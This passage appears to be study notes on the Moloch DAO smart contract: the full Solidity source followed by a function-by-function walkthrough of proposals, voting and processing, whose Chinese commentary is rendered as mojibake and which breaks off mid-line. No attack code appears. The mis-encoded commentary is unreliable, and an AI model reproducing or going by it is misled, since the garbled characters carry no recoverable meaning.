MAX_GRACE_PERIOD_LENGTH = 10**18; // maximum length of grace period\n    uint256 constant MAX_DILUTION_BOUND = 10**18; // maximum dilution bound\n    uint256 constant MAX_NUMBER_OF_SHARES = 10**18; // maximum number of shares that can be minted\n\n    /***************\n    EVENTS\n    ***************/\n    event SubmitProposal(uint256 proposalIndex, address indexed delegateKey, address indexed memberAddress, address indexed applicant, uint256 tokenTribute, uint256 sharesRequested);\n    event SubmitVote(uint256 indexed proposalIndex, address indexed delegateKey, address indexed memberAddress, uint8 uintVote);\n    event ProcessProposal(uint256 indexed proposalIndex, address indexed applicant, address indexed memberAddress, uint256 tokenTribute, uint256 sharesRequested, bool didPass);\n    event Ragequit(address indexed memberAddress, uint256 sharesToBurn);\n    event Abort(uint256 indexed proposalIndex, address applicantAddress);\n    event UpdateDelegateKey(address indexed memberAddress, address newDelegateKey);\n    event SummonComplete(address indexed summoner, uint256 shares);\n\n    /******************\n    INTERNAL ACCOUNTING\n    ******************/\n    uint256 public totalShares = 0; // total shares across all members\n    uint256 public totalSharesRequested = 0; // total shares that have been requested in unprocessed proposals\n\n    enum Vote &#123;\n        Null, // default value, counted as abstention\n        Yes,\n        No\n    &#125;\n\n    struct Member &#123;\n        address delegateKey; // the key responsible for submitting proposals and voting - defaults to member address unless updated\n        uint256 shares; // the # of shares assigned to this member\n        bool exists; // always true once a member has been created\n        uint256 highestIndexYesVote; // highest proposal index # on which the member voted YES\n    &#125;\n\n    struct Proposal &#123;\n        address proposer; // the member who submitted the proposal\n        address applicant; // the applicant who wishes to become a member - this key will be used for withdrawals\n        uint256 sharesRequested; // the # of shares the applicant is requesting\n        uint256 startingPeriod; // the period in which voting can start for this proposal\n        uint256 yesVotes; // the total number of YES votes for this proposal\n        uint256 noVotes; // the total number of NO votes for this proposal\n        bool processed; // true only if the proposal has been processed\n        bool didPass; // true only if the proposal passed\n        bool aborted; // true only if applicant calls \"abort\" fn before end of voting period\n        uint256 tokenTribute; // amount of tokens offered as tribute\n        string details; // proposal details - could be IPFS hash, plaintext, or JSON\n        uint256 maxTotalSharesAtYesVote; // the maximum # of total shares encountered at a yes vote on this proposal\n        mapping (address => Vote) votesByMember; // the votes on this proposal by each member\n    &#125;\n\n    mapping (address => Member) public members;\n    mapping (address => address) public memberAddressByDelegateKey;\n    Proposal[] public proposalQueue;\n\n    /********\n    MODIFIERS\n    ********/\n    modifier onlyMember &#123;\n        require(members[msg.sender].shares > 0, \"Moloch::onlyMember - not a member\");\n        _;\n    &#125;\n\n    modifier onlyDelegate &#123;\n        require(members[memberAddressByDelegateKey[msg.sender]].shares > 0, \"Moloch::onlyDelegate - not a delegate\");\n        _;\n    &#125;\n\n    /********\n    FUNCTIONS\n    ********/\n    constructor(\n        address summoner,\n        address _approvedToken,\n        uint256 _periodDuration,\n        uint256 _votingPeriodLength,\n        uint256 _gracePeriodLength,\n        uint256 _abortWindow,\n        uint256 _proposalDeposit,\n        uint256 _dilutionBound,\n        uint256 _processingReward\n    ) public &#123;\n        require(summoner != address(0), \"Moloch::constructor - summoner cannot be 0\");\n        require(_approvedToken != address(0), \"Moloch::constructor - _approvedToken cannot be 0\");\n        require(_periodDuration > 0, \"Moloch::constructor - _periodDuration cannot be 0\");\n        require(_votingPeriodLength > 0, \"Moloch::constructor - _votingPeriodLength cannot be 0\");\n        require(_votingPeriodLength &lt;= MAX_VOTING_PERIOD_LENGTH, \"Moloch::constructor - _votingPeriodLength exceeds limit\");\n        require(_gracePeriodLength &lt;= MAX_GRACE_PERIOD_LENGTH, \"Moloch::constructor - _gracePeriodLength exceeds limit\");\n        require(_abortWindow > 0, \"Moloch::constructor - _abortWindow cannot be 0\");\n        require(_abortWindow &lt;= _votingPeriodLength, \"Moloch::constructor - _abortWindow must be smaller than or equal to _votingPeriodLength\");\n        require(_dilutionBound > 0, \"Moloch::constructor - _dilutionBound cannot be 0\");\n        require(_dilutionBound &lt;= MAX_DILUTION_BOUND, \"Moloch::constructor - _dilutionBound exceeds limit\");\n        require(_proposalDeposit >= _processingReward, \"Moloch::constructor - _proposalDeposit cannot be smaller than _processingReward\");\n\n        approvedToken = IERC20(_approvedToken);\n\n        guildBank = new GuildBank(_approvedToken);\n\n        periodDuration = _periodDuration;\n        votingPeriodLength = _votingPeriodLength;\n        gracePeriodLength = _gracePeriodLength;\n        abortWindow = _abortWindow;\n        proposalDeposit = _proposalDeposit;\n        dilutionBound = _dilutionBound;\n        processingReward = _processingReward;\n\n        summoningTime = now;\n\n        members[summoner] = Member(summoner, 1, true, 0);\n        memberAddressByDelegateKey[summoner] = summoner;\n        totalShares = 1;\n\n        emit SummonComplete(summoner, 1);\n    &#125;\n\n    /*****************\n    PROPOSAL FUNCTIONS\n    *****************/\n\n    function submitProposal(\n        address applicant,\n        uint256 tokenTribute,\n        uint256 sharesRequested,\n        string memory details\n    )\n        public\n        onlyDelegate\n    &#123;\n        require(applicant != address(0), \"Moloch::submitProposal - applicant cannot be 0\");\n\n        // Make sure we won't run into overflows when doing calculations with shares.\n        // Note that totalShares + totalSharesRequested + sharesRequested is an upper bound\n        // on the number of shares that can exist until this proposal has been processed.\n        require(totalShares.add(totalSharesRequested).add(sharesRequested) &lt;= MAX_NUMBER_OF_SHARES, \"Moloch::submitProposal - too many shares requested\");\n\n        totalSharesRequested = totalSharesRequested.add(sharesRequested);\n\n        address memberAddress = memberAddressByDelegateKey[msg.sender];\n\n        // collect proposal deposit from proposer and store it in the Moloch until the proposal is processed\n        require(approvedToken.transferFrom(msg.sender, address(this), proposalDeposit), \"Moloch::submitProposal - proposal deposit token transfer failed\");\n\n        // collect tribute from applicant and store it in the Moloch until the proposal is processed\n        require(approvedToken.transferFrom(applicant, address(this), tokenTribute), \"Moloch::submitProposal - tribute token transfer failed\");\n\n        // compute startingPeriod for proposal\n        uint256 startingPeriod = max(\n            getCurrentPeriod(),\n            proposalQueue.length == 0 ? 0 : proposalQueue[proposalQueue.length.sub(1)].startingPeriod\n        ).add(1);\n\n        // create proposal ...\n        Proposal memory proposal = Proposal(&#123;\n            proposer: memberAddress,\n            applicant: applicant,\n            sharesRequested: sharesRequested,\n            startingPeriod: startingPeriod,\n            yesVotes: 0,\n            noVotes: 0,\n            processed: false,\n            didPass: false,\n            aborted: false,\n            tokenTribute: tokenTribute,\n            details: details,\n            maxTotalSharesAtYesVote: 0\n        &#125;);\n\n        // ... and append it to the queue\n        proposalQueue.push(proposal);\n\n        uint256 proposalIndex = proposalQueue.length.sub(1);\n        emit SubmitProposal(proposalIndex, msg.sender, memberAddress, applicant, tokenTribute, sharesRequested);\n    &#125;\n\n    function submitVote(uint256 proposalIndex, uint8 uintVote) public onlyDelegate &#123;\n        address memberAddress = memberAddressByDelegateKey[msg.sender];\n        Member storage member = members[memberAddress];\n\n        require(proposalIndex &lt; proposalQueue.length, \"Moloch::submitVote - proposal does not exist\");\n        Proposal storage proposal = proposalQueue[proposalIndex];\n\n        require(uintVote &lt; 3, \"Moloch::submitVote - uintVote must be less than 3\");\n        Vote vote = Vote(uintVote);\n\n        require(getCurrentPeriod() >= proposal.startingPeriod, \"Moloch::submitVote - voting period has not started\");\n        require(!hasVotingPeriodExpired(proposal.startingPeriod), \"Moloch::submitVote - proposal voting period has expired\");\n        require(proposal.votesByMember[memberAddress] == Vote.Null, \"Moloch::submitVote - member has already voted on this proposal\");\n        require(vote == Vote.Yes || vote == Vote.No, \"Moloch::submitVote - vote must be either Yes or No\");\n        require(!proposal.aborted, \"Moloch::submitVote - proposal has been aborted\");\n\n        // store vote\n        proposal.votesByMember[memberAddress] = vote;\n\n        // count vote\n        if (vote == Vote.Yes) &#123;\n            proposal.yesVotes = proposal.yesVotes.add(member.shares);\n\n            // set highest index (latest) yes vote - must be processed for member to ragequit\n            if (proposalIndex > member.highestIndexYesVote) &#123;\n                member.highestIndexYesVote = proposalIndex;\n            &#125;\n\n            // set maximum of total shares encountered at a yes vote - used to bound dilution for yes voters\n            if (totalShares > proposal.maxTotalSharesAtYesVote) &#123;\n                proposal.maxTotalSharesAtYesVote = totalShares;\n            &#125;\n\n        &#125; else if (vote == Vote.No) &#123;\n            proposal.noVotes = proposal.noVotes.add(member.shares);\n        &#125;\n\n        emit SubmitVote(proposalIndex, msg.sender, memberAddress, uintVote);\n    &#125;\n\n    function processProposal(uint256 proposalIndex) public &#123;\n        require(proposalIndex &lt; proposalQueue.length, \"Moloch::processProposal - proposal does not exist\");\n        Proposal storage proposal = proposalQueue[proposalIndex];\n        require(getCurrentPeriod() >= proposal.startingPeriod.add(votingPeriodLength).add(gracePeriodLength), \"Moloch::processProposal - proposal is not ready to be processed\");\n        require(proposal.processed == false, \"Moloch::processProposal - proposal has already been processed\");\n        require(proposalIndex == 0 || proposalQueue[proposalIndex.sub(1)].processed, \"Moloch::processProposal - previous proposal must be processed\");\n        proposal.processed = true;\n        totalSharesRequested = totalSharesRequested.sub(proposal.sharesRequested);\n        bool didPass = proposal.yesVotes > proposal.noVotes;\n        // Make the proposal fail if the dilutionBound is exceeded\n        if (totalShares.mul(dilutionBound) &lt; proposal.maxTotalSharesAtYesVote) &#123;\n            didPass = false;\n        &#125;\n        // PROPOSAL PASSED\n        if (didPass &amp;&amp; !proposal.aborted) &#123;\n            proposal.didPass = true;\n            // if the applicant is already a member, add to their existing shares\n            if (members[proposal.applicant].exists) &#123;\n                members[proposal.applicant].shares = members[proposal.applicant].shares.add(proposal.sharesRequested);\n            // the applicant is a new member, create a new record for them\n            &#125; else &#123;\n                // if the applicant address is already taken by a member's delegateKey, reset it to their member address\n                if (members[memberAddressByDelegateKey[proposal.applicant]].exists) &#123;\n                    address memberToOverride = memberAddressByDelegateKey[proposal.applicant];\n                    memberAddressByDelegateKey[memberToOverride] = memberToOverride;\n                    members[memberToOverride].delegateKey = memberToOverride;\n                &#125;\n                // use applicant address as delegateKey by default\n                members[proposal.applicant] = Member(proposal.applicant, proposal.sharesRequested, true, 0);\n                memberAddressByDelegateKey[proposal.applicant] = proposal.applicant;\n            &#125;\n            // mint new shares\n            totalShares = totalShares.add(proposal.sharesRequested);\n            // transfer tokens to guild bank\n            require(\n                approvedToken.transfer(address(guildBank), proposal.tokenTribute),\n                \"Moloch::processProposal - token transfer to guild bank failed\"\n            );\n        // PROPOSAL FAILED OR ABORTED\n        &#125; else &#123;\n            // return all tokens to the applicant\n            require(\n                approvedToken.transfer(proposal.applicant, proposal.tokenTribute),\n                \"Moloch::processProposal - failing vote token transfer failed\"\n            );\n        &#125;\n        // send msg.sender the processingReward\n        require(\n            approvedToken.transfer(msg.sender, processingReward),\n            \"Moloch::processProposal - failed to send processing reward to msg.sender\"\n        );\n        // return deposit to proposer (subtract processing reward)\n        require(\n            approvedToken.transfer(proposal.proposer, proposalDeposit.sub(processingReward)),\n            \"Moloch::processProposal - failed to return proposal deposit to proposer\"\n        );\n        emit ProcessProposal(\n            proposalIndex,\n            proposal.applicant,\n            proposal.proposer,\n            proposal.tokenTribute,\n            proposal.sharesRequested,\n            didPass\n        );\n    &#125;\n\n    function ragequit(uint256 sharesToBurn) public onlyMember &#123;\n        uint256 initialTotalShares = totalShares;\n\n        Member storage member = members[msg.sender];\n\n        require(member.shares >= sharesToBurn, \"Moloch::ragequit - insufficient shares\");\n\n        require(canRagequit(member.highestIndexYesVote), \"Moloch::ragequit - cant ragequit until highest index proposal member voted YES on is processed\");\n\n        // burn shares\n        member.shares = member.shares.sub(sharesToBurn);\n        totalShares = totalShares.sub(sharesToBurn);\n\n        // instruct guildBank to transfer fair share of tokens to the ragequitter\n        require(\n            guildBank.withdraw(msg.sender, sharesToBurn, initialTotalShares),\n            \"Moloch::ragequit - withdrawal of tokens from guildBank failed\"\n        );\n\n        emit Ragequit(msg.sender, sharesToBurn);\n    &#125;\n\n    function abort(uint256 proposalIndex) public &#123;\n        require(proposalIndex &lt; proposalQueue.length, \"Moloch::abort - proposal does not exist\");\n        Proposal storage proposal = proposalQueue[proposalIndex];\n\n        require(msg.sender == proposal.applicant, \"Moloch::abort - msg.sender must be applicant\");\n        require(getCurrentPeriod() &lt; proposal.startingPeriod.add(abortWindow), \"Moloch::abort - abort window must not have passed\");\n        require(!proposal.aborted, \"Moloch::abort - proposal must not have already been aborted\");\n\n        uint256 tokensToAbort = proposal.tokenTribute;\n        proposal.tokenTribute = 0;\n        proposal.aborted = true;\n\n        // return all tokens to the applicant\n        require(\n            approvedToken.transfer(proposal.applicant, tokensToAbort),\n            \"Moloch::processProposal - failed to return tribute to applicant\"\n        );\n\n        emit Abort(proposalIndex, msg.sender);\n    &#125;\n\n    function updateDelegateKey(address newDelegateKey) public onlyMember &#123;\n        require(newDelegateKey != address(0), \"Moloch::updateDelegateKey - newDelegateKey cannot be 0\");\n\n        // skip checks if member is setting the delegate key to their member address\n        if (newDelegateKey != msg.sender) &#123;\n            require(!members[newDelegateKey].exists, \"Moloch::updateDelegateKey - cant overwrite existing members\");\n            require(!members[memberAddressByDelegateKey[newDelegateKey]].exists, \"Moloch::updateDelegateKey - cant overwrite existing delegate keys\");\n        &#125;\n\n        Member storage member = members[msg.sender];\n        memberAddressByDelegateKey[member.delegateKey] = address(0);\n        memberAddressByDelegateKey[newDelegateKey] = msg.sender;\n        member.delegateKey = newDelegateKey;\n\n        emit UpdateDelegateKey(msg.sender, newDelegateKey);\n    &#125;\n\n    /***************\n    GETTER FUNCTIONS\n    ***************/\n\n    function max(uint256 x, uint256 y) internal pure returns (uint256) &#123;\n        return x >= y ? x : y;\n    &#125;\n\n    function getCurrentPeriod() public view returns (uint256) &#123;\n        return now.sub(summoningTime).div(periodDuration);\n    &#125;\n\n    function getProposalQueueLength() public view returns (uint256) &#123;\n        return proposalQueue.length;\n    &#125;\n\n    // can only ragequit if the latest proposal you voted YES on has been processed\n    function canRagequit(uint256 highestIndexYesVote) public view returns (bool) &#123;\n        require(highestIndexYesVote &lt; proposalQueue.length, \"Moloch::canRagequit - proposal does not exist\");\n        return proposalQueue[highestIndexYesVote].processed;\n    &#125;\n\n    function hasVotingPeriodExpired(uint256 startingPeriod) public view returns (bool) &#123;\n        return getCurrentPeriod() >= startingPeriod.add(votingPeriodLength);\n    &#125;\n\n    function getMemberProposalVote(address memberAddress, uint256 proposalIndex) public view returns (Vote) &#123;\n        require(members[memberAddress].exists, \"Moloch::getMemberProposalVote - member doesn't exist\");\n        require(proposalIndex &lt; proposalQueue.length, \"Moloch::getMemberProposalVote - proposal doesn't exist\");\n        return proposalQueue[proposalIndex].votesByMember[memberAddress];\n    &#125;\n&#125;\n\ninterface IERC20 &#123;\n    function transfer(address to, uint256 value) external returns (bool);\n\n    function approve(address spender, uint256 value) external returns (bool);\n\n    function transferFrom(address from, address to, uint256 value) external returns (bool);\n\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address who) external view returns (uint256);\n\n    function allowance(address owner, address spender) external view returns (uint256);\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n&#125;\n\ncontract Ownable &#123;\n    address private _owner;\n\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n\n    /**\n     * @dev The Ownable constructor sets the original `owner` of the contract to the sender\n     * account.\n     */\n    constructor () internal &#123;\n        _owner = msg.sender;\n        emit OwnershipTransferred(address(0), _owner);\n    &#125;\n\n    /**\n     * @return the address of the owner.\n     */\n    function owner() public view returns (address) &#123;\n        return _owner;\n    &#125;\n\n    /**\n     * @dev Throws if called by any account other than the owner.\n     */\n    modifier onlyOwner() &#123;\n        require(isOwner());\n        _;\n    &#125;\n\n    /**\n     * @return true if `msg.sender` is the owner of the contract.\n     */\n    function isOwner() public view returns (bool) &#123;\n        return msg.sender == _owner;\n    &#125;\n\n    /**\n     * @dev Allows the current owner to relinquish control of the contract.\n     * @notice Renouncing to ownership will leave the contract without an owner.\n     * It will not be possible to call the functions with the `onlyOwner`\n     * modifier anymore.\n     */\n    function renounceOwnership() public onlyOwner &#123;\n        emit OwnershipTransferred(_owner, address(0));\n        _owner = address(0);\n    &#125;\n\n    /**\n     * @dev Allows the current owner to transfer control of the contract to a newOwner.\n     * @param newOwner The address to transfer ownership to.\n     */\n    function transferOwnership(address newOwner) public onlyOwner &#123;\n        _transferOwnership(newOwner);\n    &#125;\n\n    /**\n     * @dev Transfers control of the contract to a newOwner.\n     * @param newOwner The address to transfer ownership to.\n     */\n    function _transferOwnership(address newOwner) internal &#123;\n        require(newOwner != address(0));\n        emit OwnershipTransferred(_owner, newOwner);\n        _owner = newOwner;\n    &#125;\n&#125;\n\ncontract GuildBank is Ownable &#123;\n    using SafeMath for uint256;\n\n    IERC20 public approvedToken; // approved token contract reference\n\n    event Withdrawal(address indexed receiver, uint256 amount);\n\n    constructor(address approvedTokenAddress) public &#123;\n        approvedToken = IERC20(approvedTokenAddress);\n    &#125;\n\n    function withdraw(address receiver, uint256 shares, uint256 totalShares) public onlyOwner returns (bool) &#123;\n        uint256 amount = approvedToken.balanceOf(address(this)).mul(shares).div(totalShares);\n        emit Withdrawal(receiver, amount);\n        return approvedToken.transfer(receiver, amount);\n    &#125;\n&#125;\n\nlibrary SafeMath &#123;\n    /**\n     * @dev Multiplies two unsigned integers, reverts on overflow.\n     */\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) &#123;\n        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the\n        // benefit is lost if 'b' is also tested.\n        // See: https://github.com/OpenZeppelin/openzeppelin-solidity/pull/522\n        if (a == 0) &#123;\n            return 0;\n        &#125;\n\n        uint256 c = a * b;\n        require(c / a == b);\n\n        return c;\n    &#125;\n\n    /**\n     * @dev Integer division of two unsigned integers truncating the quotient, reverts on division by zero.\n     */\n    function div(uint256 a, uint256 b) internal pure returns (uint256) &#123;\n        // Solidity only automatically asserts when dividing by 0\n        require(b > 0);\n        uint256 c = a / b;\n        // assert(a == b * c + a % b); // There is no case in which this doesn't hold\n\n        return c;\n    &#125;\n\n    /**\n     * @dev Subtracts two unsigned integers, reverts on overflow (i.e. if subtrahend is greater than minuend).\n     */\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) &#123;\n        require(b &lt;= a);\n        uint256 c = a - b;\n\n        return c;\n    &#125;\n\n    /**\n     * @dev Adds two unsigned integers, reverts on overflow.\n     */\n    function add(uint256 a, uint256 b) internal pure returns (uint256) &#123;\n        uint256 c = a + b;\n        require(c >= a);\n\n        return c;\n    &#125;\n\n    /**\n     * @dev Divides two unsigned integers and returns the remainder (unsigned integer modulo),\n     * reverts when dividing by zero.\n     */\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) &#123;\n        require(b != 0);\n        return a % b;\n    &#125;\n&#125;\n\nAnalyzeå˜é‡æ³¨è§£periodDurationï¼šé»˜è®¤å€¼ä¸º4.8 hours\nvotingPeriodLengthLï¼šæŠ•ç¥¨è¿›è¡ŒæœŸé™ï¼Œé»˜è®¤ä¸º7 days\ngracePeriodLengthï¼šå®½é™æœŸé™ï¼Œé»˜è®¤ä¸º7 days\nabortWindowï¼šå†staråŽçš„abortWindowæ—¶é—´å†…å¯ä»¥è¿›è¡Œä¸­æ­¢æ“ä½œ\nproposalDepositï¼šæ¯æäº¤ä¸€ä»½ææ¡ˆå°±è¦åƒdaoåˆçº¦åœ°å€å­˜å…¥proposalDepositï¼Œé»˜è®¤å€¼ä¸º10ETHã€‚\ndilutionBoundï¼šmaxTotalSharesAtYesVoteä¸èƒ½å¤§äºŽtotalshares*dilutionBoundï¼Œå¦åˆ™è§†ä¸ºä¸é€šè¿‡ï¼Œé»˜è®¤å€¼ä¸º3\nprocessingRewardï¼šç»™å¤„ç†ææ¡ˆäººçš„å¥–åŠ±ï¼Œé»˜è®¤å€¼ä¸º0.1ETH\nsummoningTimeï¼šéƒ¨ç½²æ—¶çš„æ—¶é—´\nå‡½æ•°è§£æžå‰æ®µæ—¶é—´åªæœ‰summoneræ»¡è¶³onlydelegateæ¡ä»¶ï¼Œåªæœ‰æŠ•ç¥¨é€šè¿‡åŽæ‰èƒ½æˆä¸ºmemberå¹¶å°†applicantæ·»åŠ åˆ°memberAddressByDelegateKey[proposal.applicant]åŒæ—¶å°†sharequestæ·»åŠ åˆ°memberä¸­åŽ»ï¼Œæ‰å¯ä»¥æ»¡è¶³onlydelegateæ¡ä»¶ï¼Œæ‰€ä»¥å‰å‡ ä¸ªææ¡ˆçš„åªæœ‰ä¸€ç¥¨ï¼ˆsummonerçš„shareåªæœ‰1ï¼‰ã€‚\nfunction submitProposal(\n    address applicant,\n    uint256 tokenTribute,\n    uint256 sharesRequested,\n    string memory details\n)\n    public\n    onlyDelegate\n&#123;\n    require(applicant != address(0), \"Moloch::submitProposal - applicant cannot be 0\");\n\n    // Make sure we won't run into overflows when doing calculations with shares.\n    // Note that totalShares + totalSharesRequested + sharesRequested is an upper bound\n    // on the number of shares that can exist until this proposal has been processed.\n    require(totalShares.add(totalSharesRequested).add(sharesRequested) &lt;= MAX_NUMBER_OF_SHARES, \"Moloch::submitProposal - too many shares requested\");\n\n    totalSharesRequested = totalSharesRequested.add(sharesRequested);\n\n    address memberAddress = memberAddressByDelegateKey[msg.sender];\n\n    // collect proposal deposit from proposer and store it in the Moloch until the proposal is processed\n    require(approvedToken.transferFrom(msg.sender, address(this), proposalDeposit), \"Moloch::submitProposal - proposal deposit token transfer failed\");\n\n    // collect tribute from applicant and store it in the Moloch until the proposal is processed\n    require(approvedToken.transferFrom(applicant, address(this), tokenTribute), \"Moloch::submitProposal - tribute token transfer failed\");\n\n    // compute startingPeriod for proposal\n    uint256 startingPeriod = max(\n        getCurrentPeriod(),\n        proposalQueue.length == 0 ? 0 : proposalQueue[proposalQueue.length.sub(1)].startingPeriod\n    ).add(1);\n\n    // create proposal ...\n    Proposal memory proposal = Proposal(&#123;\n        proposer: memberAddress,\n        applicant: applicant,\n        sharesRequested: sharesRequested,\n        startingPeriod: startingPeriod,\n        yesVotes: 0,\n        noVotes: 0,\n        processed: false,\n        didPass: false,\n        aborted: false,\n        tokenTribute: tokenTribute,\n        details: details,\n        maxTotalSharesAtYesVote: 0\n    &#125;);\n\n    // ... and append it to the queue\n    proposalQueue.push(proposal);\n\n    uint256 proposalIndex = proposalQueue.length.sub(1);\n    emit SubmitProposal(proposalIndex, msg.sender, memberAddress, applicant, tokenTribute, sharesRequested);\n&#125;\n\n\nsubmitProposalå‡½æ•°ç”¨äºŽæäº¤ä¸€ä¸ªææ¡ˆï¼Œåªèƒ½æ˜¯delegate\né¦–å…ˆåˆ¤æ–­ç”³è¯·äººæ˜¯å¦ä¸ºéžé›¶åœ°å€ï¼Œå†åˆ¤æ–­åœ¨æ€»å…±è‚¡æƒåŠ ä¸Šæ€»å…±çš„è¯·æ±‚è‚¡æƒæ˜¯å¦ä¼šè¶…å‡ºæœ€å¤§å€¼MAX_NUMBER_OF_SHARESï¼Œä¹‹åŽä¼šä»Žmsg.senderå‘åˆçº¦åœ°å€è½¬è´¦10ETHï¼Œå¹¶ä¸”ä»Žç”³è¯·äººå‘åˆçº¦åœ°å€è½¬è´¦tokenTributeã€‚\nèµ·å§‹æœŸå°±æ˜¯CurrentPeriod+1ï¼Œç„¶åŽå°†æ–°çš„proposalæ·»åŠ åˆ°proposalQueueæ•°ç»„ä¸­åŽ»ã€‚\nä¹‹åŽè¿›è¡ŒæŠ•ç¥¨ï¼ŒæŠ•ç¥¨é€šè¿‡ï¼Œapplicantå°†ä¼šæˆä¸ºmember\nfunction submitVote(uint256 proposalIndex, uint8 uintVote) public onlyDelegate &#123;\n    address memberAddress = memberAddressByDelegateKey[msg.sender];\n    Member storage member = members[memberAddress];\n\n    require(proposalIndex &lt; proposalQueue.length, \"Moloch::submitVote - proposal does not exist\");\n    Proposal storage proposal = proposalQueue[proposalIndex];\n\n    require(uintVote &lt; 3, \"Moloch::submitVote - uintVote must be less than 3\");\n    Vote vote = Vote(uintVote);\n\n    require(getCurrentPeriod() >= proposal.startingPeriod, \"Moloch::submitVote - voting period has not started\");\n    require(!hasVotingPeriodExpired(proposal.startingPeriod), \"Moloch::submitVote - proposal voting period has expired\");\n    require(proposal.votesByMember[memberAddress] == Vote.Null, \"Moloch::submitVote - member has already voted on this proposal\");\n    require(vote == Vote.Yes || vote == Vote.No, \"Moloch::submitVote - vote must be either Yes or No\");\n    require(!proposal.aborted, \"Moloch::submitVote - proposal has been aborted\");\n\n    // store vote\n    proposal.votesByMember[memberAddress] = vote;\n\n    // count vote\n    if (vote == Vote.Yes) &#123;\n        proposal.yesVotes = proposal.yesVotes.add(member.shares);\n\n        // set highest index (latest) yes vote - must be processed for member to ragequit\n        if (proposalIndex > member.highestIndexYesVote) &#123;\n            member.highestIndexYesVote = proposalIndex;\n        &#125;\n\n        // set maximum of total shares encountered at a yes vote - used to bound dilution for yes voters\n        if (totalShares > proposal.maxTotalSharesAtYesVote) &#123;\n            proposal.maxTotalSharesAtYesVote = totalShares;\n        &#125;\n\n    &#125; else if (vote == Vote.No) &#123;\n        proposal.noVotes = proposal.noVotes.add(member.shares);\n    &#125;\n\n    emit SubmitVote(proposalIndex, msg.sender, memberAddress, uintVote);\n&#125;\n\n\nå¯¹åº”ä¸¤ä¸ªå‚æ•°åˆ†åˆ«æ˜¯ææ¡ˆç¼–å·ä»¥åŠæ‰€æŠ•çš„ç¥¨ç±»åž‹ï¼ˆå¼ƒæƒï¼ŒåŒæ„ï¼Œå¦å®šï¼‰ï¼ŒåŒæ—¶è®°å½•ç”¨æˆ·æ‰€æŠ•çš„ç¥¨ç§\nå¦‚æžœä¸ºYESç¥¨ï¼Œææ¡ˆçš„YesVoteå°†ä¼šåŠ ä¸Šmemberçš„æ‰€æœ‰è‚¡æƒï¼ŒåŒæ—¶è®°å½•æœ€è¿‘ä¸€æ¬¡æŠ•yesç¥¨çš„ææ¡ˆç¼–å·ï¼ˆæ­¤æ¬¡ï¼‰\nå¦‚æžœä¸ºNoç¥¨ï¼Œææ¡ˆçš„NoVoteå°†ä¼šåŠ ä¸Šmemberçš„æ‰€æœ‰è‚¡æƒ\nä¹‹åŽè¿›å…¥ç¬¬ä¸‰è½®ï¼Œå¤„ç†ææ¡ˆ\nfunction processProposal(uint256 proposalIndex) public &#123;\n    require(proposalIndex &lt; proposalQueue.length, \"Moloch::processProposal - proposal does not exist\");\n    Proposal storage proposal = proposalQueue[proposalIndex];\n    require(getCurrentPeriod() >= proposal.startingPeriod.add(votingPeriodLength).add(gracePeriodLength), \"Moloch::processProposal - proposal is not ready to be processed\");\n    require(proposal.processed == false, \"Moloch::processProposal - proposal has already been processed\");\n    require(proposalIndex == 0 || proposalQueue[proposalIndex.sub(1)].processed, \"Moloch::processProposal - previous proposal must be processed\");\n    proposal.processed = true;\n    totalSharesRequested = totalSharesRequested.sub(proposal.sharesRequested);\n    bool didPass = proposal.yesVotes > proposal.noVotes;\n    // Make the proposal fail if the dilutionBound is exceeded\n    if (totalShares.mul(dilutionBound) &lt; proposal.maxTotalSharesAtYesVote) &#123;\n        didPass = false;\n    &#125;\n    // PROPOSAL PASSED\n    if (didPass &amp;&amp; !proposal.aborted) &#123;\n        proposal.didPass = true;\n        // if the applicant is already a member, add to their existing shares\n        if (members[proposal.applicant].exists) &#123;\n            members[proposal.applicant].shares = members[proposal.applicant].shares.add(proposal.sharesRequested);\n        // the applicant is a new member, create a new record for them\n        &#125; else &#123;\n            // if the applicant address is already taken by a member's delegateKey, reset it to their member address\n            if (members[memberAddressByDelegateKey[proposal.applicant]].exists) &#123;\n                address memberToOverride = memberAddressByDelegateKey[proposal.applicant];\n                memberAddressByDelegateKey[memberToOverride] = memberToOverride;\n                members[memberToOverride].delegateKey = memberToOverride;\n            &#125;\n            // use applicant address as delegateKey by default\n            members[proposal.applicant] = Member(proposal.applicant, proposal.sharesRequested, true, 0);\n            memberAddressByDelegateKey[proposal.applicant] = proposal.applicant;\n        &#125;\n        // mint new shares\n        totalShares = totalShares.add(proposal.sharesRequested);\n        // transfer tokens to guild bank\n        require(\n            approvedToken.transfer(address(guildBank), proposal.tokenTribute),\n            \"Moloch::processProposal - token transfer to guild bank failed\"\n        );\n    // PROPOSAL FAILED OR ABORTED\n    &#125; else &#123;\n        // return all tokens to the applicant\n        require(\n            approvedToken.transfer(proposal.applicant, proposal.tokenTribute),\n            \"Moloch::processProposal - failing vote token transfer failed\"\n        );\n    &#125;\n    // send msg.sender the processingReward\n    require(\n        approvedToken.transfer(msg.sender, processingReward),\n        \"Moloch::processProposal - failed to send processing reward to msg.sender\"\n    );\n    // return deposit to proposer (subtract processing reward)\n    require(\n        approvedToken.transfer(proposal.proposer, proposalDeposit.sub(processingReward)),\n        \"Moloch::processProposal - failed to return proposal deposit to proposer\"\n    );\n    emit ProcessProposal(\n        proposalIndex,\n        proposal.applicant,\n        proposal.proposer,\n        proposal.tokenTribute,\n        proposal.sharesRequested,\n        didPass\n    );\n&#125;\n\nä»»ä½•äººéƒ½å¯ä»¥å¤„ç†ï¼Œå‚æ•°ä¸ºæ‰€è¦å¤„ç†çš„ææ¡ˆçš„ç¼–å·ï¼Œå‚æ•°æœ‰æ‰€é™åˆ¶ï¼Œæ­¤ç¼–å·å¯¹åº”çš„ä¸Šä¸€ä¸ªææ¡ˆå¿…é¡»å·²è¢«å¤„ç†ï¼Œè¦æ±‚å½“å‰æ—¶é—´å¤§äºŽå¼€å§‹æ—¶é—´+æŠ•ç¥¨æœŸé™+å®½é™æœŸé™ï¼Œåªè¦ææ¡ˆçš„åŒæ„ç¥¨æ•°å¤§äºŽå¦å®šç¥¨æ•°å³è§†ä¸ºé€šè¿‡\ncase0 falseå°†ç”³è¯·è€…çš„tokenTributeåŽŸè·¯é€€å›ž\ncase1 